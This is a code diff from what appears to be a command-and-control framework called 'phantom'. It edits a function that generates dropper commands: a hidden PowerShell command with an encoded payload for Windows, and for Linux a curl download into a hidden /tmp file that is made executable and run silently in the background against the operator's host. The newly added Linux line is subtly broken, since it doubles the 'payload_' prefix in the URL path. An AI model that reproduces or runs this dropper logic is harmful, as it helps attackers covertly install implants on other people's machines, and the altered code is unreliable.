@@ -170,7 +170,7 @@ def _payload_scheme(port: int) -> str:
     return "https" if port in (443, 8443) else "http"
 
 
-def generate_dropper(platform: str, lhost: str, lport: int) -> str:
+def generate_dropper(platform: str, lhost: str, lport: int, arch: str = "x64") -> str:
     """Generates the dropper command for the specified platform with auth token."""
     from phantom.utils.c2_crypto import get_payload_token
 
@@ -186,7 +186,8 @@ def generate_dropper(platform: str, lhost: str, lport: int) -> str:
         return f"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {b64_ps}"
 
     elif platform == "linux":
-        url = f"{scheme}://{lhost}:{lport}/api/v1/payload_linux?{token_param}"
+        path = "payload_linux_x86" if arch == "x86" else "payload_linux"
+        url = f"{scheme}://{lhost}:{lport}/api/v1/payload_{path}?{token_param}"
         return f"curl -sk '{url}' -o /tmp/.phantom && chmod +x /tmp/.phantom && nohup /tmp/.phantom {lhost} {lport} &>/dev/null &"
 
     elif platform == "macos":
